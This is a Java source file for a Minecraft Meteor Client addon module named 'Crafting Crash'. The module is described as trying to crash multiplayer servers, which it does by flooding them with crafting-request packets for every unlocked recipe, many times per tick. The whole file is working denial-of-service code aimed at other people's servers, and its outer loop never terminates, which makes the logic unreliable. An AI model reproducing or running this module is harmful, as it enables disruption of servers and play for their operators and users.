package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.Recipe;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.screen.CraftingScreenHandler;

import java.util.List;
import java.util.Objects;
import java.util.stream.IntStream;

public class CraftingCrash extends Module {

    private final Setting<Integer> packets;

    private final Setting<Boolean> autoDisable;


    public CraftingCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Crafting Crash", "CRYSTAL || Tries to crash the server by spamming crafting packets");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        packets = sgGeneral.add(new IntSetting.Builder()
            .name("packets")
            .description("How many packets to send per tick. Warning: this is multiplied by the amount of unlocked recipes")
            .defaultValue(24)
            .min(1)
            .sliderMax(50)
            .build());

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
        );
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            if ((mc.player == null) || ((mc.getNetworkHandler() != null) && (mc.player.currentScreenHandler instanceof CraftingScreenHandler))) {
                try {
                    List<RecipeResultCollection> recipeResultCollectionList = null;
                    if (mc.player != null) {
                        recipeResultCollectionList = mc.player.getRecipeBook().getOrderedResults();
                    }
                    int j = 0;
                    while (true) {
                        if ((recipeResultCollectionList != null) && (j < recipeResultCollectionList.size())) {
                            RecipeResultCollection recipeResultCollection = recipeResultCollectionList.get(j);
                            List<RecipeEntry<?>> recipes = recipeResultCollection.getRecipes(true);
                            int k = 0;
                            do {
                                if (k < recipes.size()) {
                                    RecipeEntry<?> recipe = recipes.get(k);
                                    IntStream.range(0, packets.get()).forEach(i -> Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new CraftRequestC2SPacket(mc.player.currentScreenHandler.syncId, recipe, true)));
                                    k++;
                                } else {
                                    break;
                                }
                            } while (true);
                            j++;
                        }
                    }

                } catch (Exception ignored) {
                    error("Stopping crash because an error occurred!");
                    toggle();
                }
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }
}
